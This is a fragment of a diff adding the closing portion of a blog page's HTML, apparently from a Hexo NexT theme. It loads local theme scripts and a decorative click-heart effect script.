+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/click.js"></script>
+
